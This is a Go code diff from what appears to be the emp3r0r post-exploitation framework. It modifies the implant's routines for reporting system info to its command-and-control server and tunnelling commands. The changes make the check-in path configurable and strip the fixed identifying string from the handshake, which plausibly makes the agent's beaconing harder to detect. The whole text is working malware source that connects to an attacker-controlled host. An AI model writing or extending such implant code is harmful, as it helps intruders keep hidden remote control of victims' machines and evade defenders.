@@ -26,7 +26,11 @@ import (
 
 // ReportStatus poll CC server and report its system info
 func ReportStatus(info *def.Emp3r0rAgent) (err error) {
-	reportStatusURL := netutil.JoinURL(def.CCAddress, transport.CheckInAPI, uuid.NewString())
+	checkinPath := common.RuntimeConfig.CheckInPath
+	if checkinPath == "" {
+		checkinPath = transport.CheckInAPI
+	}
+	reportStatusURL := netutil.JoinURL(def.CCAddress, checkinPath, uuid.NewString())
 	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
 
 	conn, _, _, err := EstablishC2Connection(reportStatusURL)
@@ -114,22 +118,29 @@ func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel con
 		defer cancel()
 		for ctx.Err() == nil {
 			// read response
-			var msg def.MsgTunData // data being exchanged in the tunnel
-			if decodeErr := in.Decode(&msg); decodeErr != nil {
-				logging.Print("Check CC response: CBOR msg decode: ", decodeErr)
-				break
-			}
-			resp := msg.Response
-			if strings.HasPrefix(string(resp), def.TransportString) {
-				// mark the hello as success
-				if _, ok := HandShakes.Load(msg.CmdID); ok {
-					HandShakes.Store(msg.CmdID, true)
-				}
+			// first, we need to handle the handshake response which is raw random bytes
+			// after that, it will be structured MsgTunData
+			var msgData []byte
+			if decodeErr := in.Decode(&msgData); decodeErr == nil {
+				// if it's a byte slice, it might be a handshake reply
+				// currently handshakes are the only raw byte replies
+				HandShakes.Range(func(key, value any) bool {
+					if isSuccess, ok := value.(bool); ok && !isSuccess {
+						HandShakes.Store(key, true)
+						return false // found one, stop iteration
+					}
+					return true
+				})
 				continue
-			} else if strings.HasPrefix(string(resp), "hello") || strings.HasPrefix(string(resp), "emp3r0r") {
-				// if we receive something that looks like a hello response but doesn't match our prefix
-				logging.Warningf("Received handshake response with mismatching prefix: %q (expected %q). Agent binary might be outdated.",
-					string(resp), def.TransportString)
+			}
+
+			// if it's not a byte slice, it should be MsgTunData
+			var msg def.MsgTunData
+			if decodeErr := in.Decode(&msg); decodeErr != nil {
+				if !strings.Contains(decodeErr.Error(), "context canceled") && decodeErr != io.EOF {
+					logging.Print("Check CC response: CBOR msg decode: ", decodeErr)
+				}
+				break
 			}
 
 			// process CC data; copy to avoid concurrent reuse of msg in next loop
@@ -163,7 +174,7 @@ func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel con
 			cnt-- // consume cnt
 
 			// send hello
-			hello_msg.CmdSlice = []string{def.TransportString, common.RuntimeConfig.AgentUUID, common.RuntimeConfig.AgentUUIDSig, util.RandStr(util.RandInt(1, 100))}
+			hello_msg.CmdSlice = []string{common.RuntimeConfig.AgentUUID, common.RuntimeConfig.AgentUUIDSig, util.RandStr(util.RandInt(1, 100))}
 			hello_msg.CmdID = uuid.NewString()
 			hello_msg.Tag = common.RuntimeConfig.AgentTag
 			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
